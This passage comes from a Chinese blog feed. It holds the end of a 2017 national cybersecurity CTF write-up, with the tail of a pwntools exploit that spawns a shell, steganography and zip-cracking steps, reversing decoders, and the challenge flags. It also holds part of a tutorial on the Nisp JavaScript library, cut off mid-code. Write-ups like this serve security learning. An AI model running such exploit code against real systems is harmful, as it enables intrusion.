p32(sh_addr)</span><br><span class="line">payload += p32(sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="Misc1-一维码"><a href="#Misc1-一维码" class="headerlink" title="Misc1 一维码"></a>Misc1 一维码</h1><p>首先，从图片中进行 <code>LSB</code> 提取，能获取一个 <code>ELF</code> 文件。</p><p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/76519164-file_1492348397533_13ebf.png" alt=""></p><p>又因为之前扫码得知一个针对可执行文件的隐写工具hydan，通过这个就能得到flag了。</p><h1 id="Misc3乾坤"><a href="#Misc3乾坤" class="headerlink" title="Misc3乾坤"></a>Misc3乾坤</h1><p>在数据包导出http对象，里面有2个zip包（在linux下可以看得清楚），解压后一个是flag.exe另一个是encode.py，encode.py是把flag进行多次b64替换并做处理，而flag.exe在最后面附带了密文，编写decode.py即可</p><p><code>flag{n1_hEn_baNg_0}</code></p><h1 id="Misc4-轨迹"><a href="#Misc4-轨迹" class="headerlink" title="Misc4 轨迹"></a>Misc4 轨迹</h1><p>USB流量捕获与解析，之前在360安全客看到过类似的题目，我记得好像还是XNUCA Misc专场的题。猜测又是画flag了，祭出我的神器！（当然也不是我的是github上的大神写的）<a href="https://github.com/gloxec/UsbMiceDataHacker" target="_blank" rel="noopener">https://github.com/gloxec/UsbMiceDataHacker</a></p><p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/26696594-file_1492349034373_3a9b.png" alt=""></p><p>经过一番艰难的识别。。。。</p><h1 id="Misc5-种棵树吧"><a href="#Misc5-种棵树吧" class="headerlink" title="Misc5 种棵树吧"></a>Misc5 种棵树吧</h1><p>对第一个图片斌walk 得到一个gif，加上头，能得到 In-order <code>{RY!heHVaL-goAI{dxj_GpnUw8}kzu*Er:s56fFl2i}</code><br>strings 第二个图片得到  Post-order<code>{YR!eVa-gLAoxd_j{pw}8zkUnGuIHh:r65f2lFsEi*}</code><br>二叉树就二叉树吗 …真是的<br>由中序和后序画出二叉树，然后按层次遍历 得到hi!HEReIsYouFLAG:flag{n52V-jPU6d_kx8zw}</p><h1 id="Misc6-我们的秘密"><a href="#Misc6-我们的秘密" class="headerlink" title="Misc6 我们的秘密"></a>Misc6 我们的秘密</h1><p>对文件进行<code>binwak secret.zip -e</code>得到一个reame.txt文件，使用明文攻击，得到压缩包密码：3xatu2o17<br>解压后主要有两文件，一个音频，一个视频，音频中解摩尔斯得到CTFSECWAR2017，然后猜测题目的意思，our secret这是一款隐写软件，通过他和之前得到的字符串得到<code>flag{v1de0_c0nc3a1_lala}</code></p><p><img src="http://oayoilchh.bkt.clouddn.com/17-4-16/34757794-file_1492350154404_4c6b.png" alt=""></p><h1 id="MOBILE1-拯救鲁班七号"><a href="#MOBILE1-拯救鲁班七号" class="headerlink" title="MOBILE1 拯救鲁班七号"></a>MOBILE1 拯救鲁班七号</h1><p>题目对输入的字符串进行简单的变换，每个循环中，首先将当前index指向的相邻两个字符互换，然后将进入一个小循环依次每隔3个互换。加解密时需注意互换的边界。密文为“!S#@A4DF32511@43”，明文为“!@#@ASDF3451123”。<br>加解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'!@#@ASDF34511234'</span></span><br><span class="line"><span class="keyword">print</span> len(s)</span><br><span class="line">l = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(l) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>, len(l), <span class="number">4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = 'S!@#@1FD23154A34'</span></span><br><span class="line"><span class="comment"># l = list(s)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(((len(l) &amp; (~<span class="number">1</span>)) - <span class="number">3</span>), <span class="number">0</span>, <span class="number">-2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range((len(l) - <span class="number">1</span>) &amp; (~<span class="number">3</span>), <span class="number">3</span>, <span class="number">-4</span>):</span><br><span class="line">        l[j - <span class="number">4</span>], l[j] = l[j], l[j - <span class="number">4</span>]</span><br><span class="line">    l[i], l[i - <span class="number">1</span>] = l[i - <span class="number">1</span>], l[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l)</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l) == s</span><br></pre></td></tr></table></figure><h1 id="MOBILE-2-人民的名义-抓捕赵德汉1"><a href="#MOBILE-2-人民的名义-抓捕赵德汉1" class="headerlink" title="MOBILE 2 人民的名义-抓捕赵德汉1"></a>MOBILE 2 人民的名义-抓捕赵德汉1</h1><p>首先从sqlite数据库里取一个字符串，id为2，表为users，取出来字符串为9838e888496bfda98afdbb98a9b9a9d9cdfa29，然后会将输入做一些变换与字符串比较，变换的规则为每个字符的低四位取反并转为十六进制，然后加上高四位与0xe异或。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'9838e888496bfda98afdbb98a9b9a9d9cdfa29'</span></span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    l.append(chr(</span><br><span class="line">        (~int(s[i], <span class="number">16</span>) &amp; <span class="number">0xf</span>) + ((int(s[i + <span class="number">1</span>], <span class="number">16</span>) ^ <span class="number">0xe</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    ))</span><br><span class="line"><span class="keyword">print</span> l</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l)</span><br></pre></td></tr></table></figure><h1 id="MOBILE-3-人民的名义-抓捕赵德汉2"><a href="#MOBILE-3-人民的名义-抓捕赵德汉2" class="headerlink" title="MOBILE 3 人民的名义-抓捕赵德汉2"></a>MOBILE 3 人民的名义-抓捕赵德汉2</h1><p>这个题有两种解法，第一种反编译newClassName.class，里面有个md5：<code>fa3733c647dca53a66cf8df953c2d539</code> ，cmd5上查一下是monkey99就是flag。<br>第二种正统的做法，是反编译CheckPassword.class，发现里面动态加载了一个class，这个class使用aes加密存于ClassEnc文件中，aes密钥的十六进制是<code>bb27630cf264f8567d185008c10c3f96</code> ，把这个ClassEnc文件解密，即可得到newClassName.class文件的内容，后面的步骤同第一个解法</p><h1 id="MOBILE-4-The-Marauder’s-Map"><a href="#MOBILE-4-The-Marauder’s-Map" class="headerlink" title="MOBILE 4 The Marauder’s Map"></a>MOBILE 4 The Marauder’s Map</h1><p>本题使用双字节混淆，众所周知java是支持双字节变量名的，也就是说你可以起中文的变量名，这并不影响编译，因此可以直接反编译class代码，然后直接重新编译运行就好了。<br>这个题使用的是自己的system类，因此要注意不要和系统的system类弄混了。<br>这个题首先由一个复杂的字符串每个字符右移一位生成一个密钥，然后遍历输入，计算当前索引的斐波那契数列的值，作为对密钥的索引，然后拼接起来就是目标flag。<br>这里密钥的获取只能用java来实现，其余可以用Python来实现。<br>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   String x = <span class="string">""</span>;</span><br><span class="line">   <span class="keyword">char</span>[] var5;</span><br><span class="line">   <span class="keyword">int</span> var4 = (var5 = <span class="string">"vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬"</span>.toCharArray()).length;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> var3 = <span class="number">0</span>; var3 &lt; var4; ++var3) &#123;</span><br><span class="line">      <span class="keyword">char</span> $ = var5[var3];</span><br><span class="line">      x = x + (<span class="keyword">char</span>)(($ &gt;&gt; <span class="number">1</span>) + <span class="number">15</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> f(i - <span class="number">1</span>) + f(i - <span class="number">2</span>) <span class="keyword">if</span> i &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(i, s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> f(i) % len(s)</span><br><span class="line">key = <span class="string">"JsnatterrtJuaththovacke"</span></span><br><span class="line">l = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        l.append(key[d(i + k, key)])</span><br><span class="line">    l.append(<span class="string">'-'</span>)</span><br><span class="line">    i += <span class="number">5</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(l)[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h1 id="MOBILE-5-取证密码"><a href="#MOBILE-5-取证密码" class="headerlink" title="MOBILE 5 取证密码"></a>MOBILE 5 取证密码</h1><p>本题lib中有一个字符串和一个整数数组，只要按整数数组里的顺序从字符串中取出字符，拼接起来就是flag<br>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">'yInS567!bcNOUV8vwCDefXYZadoPQRGx13ghTpqrsHklm2EFtuJKLzMijAB094W'</span></span><br><span class="line">l = [<span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">7</span>, <span class="number">0xA</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x13</span>, <span class="number">2</span>, <span class="number">0x3A</span>, <span class="number">0xC</span>, <span class="number">0x11</span>, <span class="number">0x31</span>, <span class="number">0x3B</span>, <span class="number">0xB</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    s.append(key[i])</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(s)</span><br></pre></td></tr></table></figure><p><img src="http://i2.muimg.com/567571/1503017cb0e6341b.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第三届全国网络空间安全技术大赛-线上初赛&quot;&gt;&lt;a href=&quot;#第三届全国网络空间安全技术大赛-线上初赛&quot; class=&quot;headerlink&quot; title=&quot;第三届全国网络空间安全技术大赛(线上初赛)&quot;&gt;&lt;/a&gt;第三届全国网络空间安全技术大赛(线上初赛)&lt;/h1
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nisp之道</title>
    <link href="https://www.ycjcl.cc/2018/07/08/Nisp%E4%B9%8B%E9%81%93/"/>
    <id>https://www.ycjcl.cc/2018/07/08/Nisp之道/</id>
    <published>2018-07-08T15:44:01.000Z</published>
    <updated>2018-07-08T15:44:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nisp"><a href="#Nisp" class="headerlink" title="Nisp"></a>Nisp</h1><h2 id="什么是Nisp-？"><a href="#什么是Nisp-？" class="headerlink" title="什么是Nisp ？"></a>什么是Nisp ？</h2><p>详情请见<a href="https://github.com/ysmood/nisp" target="_blank" rel="noopener">YsMood_Nisp</a>，<a href="https://github.com/ysmood/nisp/wiki/Nisp%E4%B8%8A%E6%89%8B%E6%96%87%E6%A1%A3" target="_blank" rel="noopener">Nisp上手文档</a></p><p><code>Nisp</code>一种跨平台的语言，<code>Nisp</code>是一种思想，一切皆函数<code>[fun ]</code>，<code>fun</code>为<code>Nisp</code>提供的原子函数或用户自定义的方法，借鉴<code>Lisp</code>分治和线性思想，<code>nisp</code>内核只提供一种解析机制和部分原子函数，用户可以自定义方法，来满足自身业务需求，<code>Nisp</code>给用户无限的想像！</p><h2 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h2><p>表达式类似于前缀表达式，将<code>fun</code>方法(如<code>+-/*:|</code>等)放置参数之前</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>npm install nisp --save</code>完成安装</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p><a href="https://runkit.com/ysmood/nisp-demo/1.0.2" target="_blank" rel="noopener">在线测试地址</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入nisp</span></span><br><span class="line"><span class="keyword">var</span> nisp = <span class="built_in">require</span>(<span class="string">"nisp"</span>).default;</span><br><span class="line"><span class="comment">// 定义加法方法</span></span><br><span class="line"><span class="keyword">var</span> sandbox = &#123;</span><br><span class="line">    <span class="string">"+"</span>: <span class="function">(<span class="params">...args</span>) =&gt;</span> args.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 表达式</span></span><br><span class="line"><span class="keyword">var</span> exp = [<span class="string">"+"</span>, <span class="number">1</span>, <span class="number">2</span>, [<span class="string">"+"</span>, <span class="number">1</span>, <span class="number">2</span>]];</span><br><span class="line"><span class="comment">// 调用nisp方法，传入(表达式，方法)</span></span><br><span class="line">nisp(exp, sandbox); <span class="comment">// =&gt; 6</span></span><br></pre></td></tr></table></figure><p>同时，也可以采用<code>ES6</code>的写法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入nisp</span></span><br><span class="line"><span class="keyword">import</span> nisp <span class="keyword">from</span> <span class="string">'nisp'</span></span><br><span class="line"><span class="comment">// 定义加法方法</span></span><br><span class="line"><span class="keyword">var</span> sandbox = &#123;</span><br><span class="line">    <span class="string">'+'</span>: <span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 表达式</span></span><br><span class="line"><span class="keyword">var</span> exp = [<span class="string">'+'</span>, <span class="number">1</span>, <span class="number">2</span>, [<span class="string">'+'</span>, <span class="number">1</span>, <span class="number">2</span>]];</span><br><span class="line"><span class="comment">// 调用nisp方法，传入(表达式，方法)</span></span><br><span class="line">nisp(exp, sandbox); <span class="comment">// =&gt; 6</span></span><br></pre></td></tr></table></figure><h2 id="内核源码分析"><a href="#内核源码分析" class="headerlink" title="内核源码分析"></a>内核源码分析</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Eval an nisp ast</span></span><br><span class="line"><span class="comment"> * @param &#123;any&#125; ast The abstract syntax tree of nisp.</span></span><br><span class="line"><span class="comment"> * It's a common flaw that array cannot carry plain data,</span></span><br><span class="line"><span class="comment"> * such as `['foo', [1,2]]`, The `1` will be treat as a function name.</span></span><br><span class="line"><span class="comment"> * So it's recommended to use object to carry plain data,</span></span><br><span class="line"><span class="comment"> * such as translate the example to `['foo', &#123; data: [1, 2] &#125;]`.</span></span><br><span class="line"><span class="comment"> * @param &#123;Sandbox&#125; sandbox The interface to the real world.</span></span><br><span class="line"><span class="comment"> * It defined functions to reduce the data of each expression.</span></span><br><span class="line"><span class="comment"> * @param &#123;any&#125; env The system space of the vm.</span></span><br><span class="line"><span class="comment"> * @param &#123;any&#125; parent Parent context, it is used to back trace the execution stack.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params">ast: <span class="built_in">any</span>, sandbox: Sandbox, env?, parent?: Context, index = 0</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> nisp(&#123; ast, sandbox, env, parent, index &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nisp</span> (<span class="params">ctx: Context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ctx) error(ctx, <span class="string">"ctx is required"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> &#123; sandbox, ast &#125; = ctx</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sandbox) error(ctx, <span class="string">"sandbox is required"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isArray(ast)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ast.length === <span class="number">0</span>) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> action = arg(ctx, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isFunction(action)) &#123;</span><br><span class="line">            <span class="keyword">return</span> apply(action, ctx)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用沙盒里的方法</span></span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">in</span> sandbox) &#123;</span><br><span class="line">            <span class="keyword">let</span> fn = sandbox[action];</span><br><span class="line">            <span class="keyword">return</span> isFunction(fn) ? apply(fn, ctx) : fn;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            error(ctx, <span class="string">`function "<span class="subst">$&#123;action&#125;</span>" is undefined`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ast;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="常用方法解析"><a href="#常用方法解析" class="headerlink" title="常用方法解析"></a>常用方法解析</h2><h3 id=""><a href="#" class="headerlink" title="$"></a>$</h3><p>基本表达式：<code>[&#39;$&#39;, any ]</code><br>将原始输入值转成规范的基本数据类型(Number/Boolean/String)，调用其它方法时，同时也会在外包一层<code>$</code>，转成基本数据类型。</p><p>源码：<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the second ast as raw data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> macro(<span class="function"><span class="params">ctx</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ctx.ast[<span class="number">1</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><a href="https://runkit.com/ycjcl868/nisp-/3.0.0" target="_blank" rel="noopener">在线测试地址</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nisp = <span class="built_in">require</span>(<span class="string">"nisp"</span>).default;</span><br><span class="line"><span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">"nisp/lib/$"</span>).default;</span><br><span class="line"><span class="keyword">var</span> sandbox = &#123;</span><br><span class="line">    <span class="string">"$"</span>: $</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> exp = [<span class="string">'$'</span>, [<span class="number">1</span>, <span class="string">"ok"</span>]];</span><br><span class="line">nisp(exp, sandbox); <span class="comment">// =&gt; [1,"ok"]</span></span><br></pre></td></tr></table></figure><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>基本语法：<code>[: key value]</code>，用来输出一个<code>{&quot;key&quot;:&quot;value&quot;}</code>对象，</p><p>源码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现原理：('list',k1,v1,k2,v2)`dict`-&gt; 用`obj[k] = v`，生成JSON，</span></span><br><span class="line"><span class="comment">// ["list", k1, v1, k2, v2, ...]</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dict = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j; i &lt; args.length; i = ++j) &#123;</span><br><span class="line">        j = i + <span class="number">1</span>;</span><br><span class="line">        dict[args[i]] = args[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dict;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://runkit.com/ycjcl868/nisp-dict1/1.0.1" target="_blank" rel="noopener"> 在线测试地址</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nisp = <span class="built_in">require</span>(<span class="string">"nisp"</span>).default;</span><br><span class="line"><span class="keyword">var</span> dict = <span class="built_in">require</span>(<span class="string">"nisp/lib/dict"</span>).default;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sandbox = &#123;</span><br><span class="line">    <span class="string">":"</span>: dict</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> exp = [<span class="string">":"</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">nisp(exp, sandbox); <span class="comment">// =&gt; &#123;1:2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>基本语法<code>[&#39;?&#39;,a,b,c]</code>，相当于<code>if</code>判断语句中的<code>a ? b : c</code>，如果<code>a</code>存在为<code>b</code>，不存在为<code>b</code></p><p><a href="https://runkit.com/ycjcl868/nisp-if/3.0.0" target="_blank" rel="noopener">在线测试地址</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nisp = <span class="built_in">require</span>(<span class="string">"nisp"</span>).default;</span><br><span class="line"><span class="keyword">var</span> $<span class="keyword">if</span> = <span class="built_in">require</span>(<span class="string">"nisp/lib/if"</span>).default;</span><br><span class="line"><span class="keyword">var</span> sandbox = &#123;</span><br><span class="line">    <span class="string">"?"</span>: $<span class="keyword">if</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> exp = [<span class="string">'?'</span>, <span class="number">1</span> , <span class="string">'a'</span> , <span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">var</span> exp2 = [<span class="string">'?'</span>, <span class="number">0</span> , <span class="string">'a'</span> , <span class="string">'b'</span>];</span><br><span class="line"><span class="built_in">console</span>.log(nisp(exp, sandbox)); <span class="comment">// =&gt; a</span></span><br><span class="line"><span class="built_in">console</span>.log(nisp(exp2, sandbox)); <span class="comment">// =&gt; b</span></span><br></pre></td></tr></table></figure><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>基本语法<code>[&#39;list&#39;,1,2,3]</code>，将多个值转成数组。<br><a href="https://runkit.com/ycjcl868/nisp-list/3.0.0" target="_blank" rel="noopener">在线测试地址</a><br>源码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现原理：["list",a,b,c,d]  直接用`arr.push(args[i])`</span></span><br><span class="line"><span class="comment">// ["list", a, b, c, ...]</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="built_in">arguments</span>.length; i &lt; len; i++) &#123;</span><br><span class="line">        arr.push(<span class="built_in">arguments</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nisp = <span class="built_in">require</span>(<span class="string">"nisp"</span>).default;</span><br><span class="line"><span class="keyword">var</span> list = <span class="built_in">require</span>(<span class="string">"nisp/lib/list"</span>).default;</span><br><span class="line"><span class="keyword">var</span> sandbox = &#123;</span><br><span class="line">    <span class="string">"|"</span>: list</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> exp = [<span class="string">'|'</span>, <span class="number">1</span> , <span class="string">'a'</span> , <span class="string">'b'</span>];</span><br><span class="line">nisp(exp, sandbox); <span class="comment">// =&gt; [1,'a','b']</span></span><br></pre></td></tr></table></figure><h3 id="fn"><a href="#fn" class="headerlink" title="fn"></a>fn</h3><p>源码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 